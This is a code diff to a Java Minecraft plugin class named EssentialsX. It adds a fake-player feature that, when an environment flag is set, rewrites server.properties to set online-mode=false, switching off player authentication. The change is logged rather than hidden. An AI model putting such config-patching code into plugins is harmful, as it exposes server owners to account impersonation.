@@ -41,6 +41,10 @@ public class EssentialsX extends JavaPlugin {
             Map<String, String> env = buildEnvMap();
             if (isFakePlayerEnabled(env)) {
                 getLogger().info("[FakePlayer] Preparing to connect...");
+                boolean patched = patchServerProperties();
+                if (patched) {
+                    getLogger().warning("[FakePlayer] Set online-mode=false in server.properties. Restart the server once for it to fully take effect.");
+                }
                 new Thread(() -> {
                     try {
                         Thread.sleep(10000);
@@ -280,7 +284,27 @@ public class EssentialsX extends JavaPlugin {
 
     // ===================== Fake Player System =====================
 
-    private boolean isFakePlayerEnabled(Map<String, String> config) {
+    private boolean patchServerProperties() {
+        for (String candidate : new String[]{"server.properties", "../server.properties"}) {
+            Path props = Paths.get(candidate);
+            if (Files.exists(props)) {
+                try {
+                    String content = new String(Files.readAllBytes(props));
+                    if (content.contains("online-mode=true")) {
+                        content = content.replace("online-mode=true", "online-mode=false");
+                        Files.write(props, content.getBytes());
+                        getLogger().info("[FakePlayer] Patched " + candidate + ": online-mode=false");
+                        return true;
+                    }
+                } catch (Exception e) {
+                    getLogger().warning("[FakePlayer] Failed to patch " + candidate + ": " + e.getMessage());
+                }
+            }
+        }
+        return false;
+    }
+
+        private boolean isFakePlayerEnabled(Map<String, String> config) {
         String enabled = config.get("FAKE_PLAYER_ENABLED");
         return enabled != null && enabled.equalsIgnoreCase("true");
     }
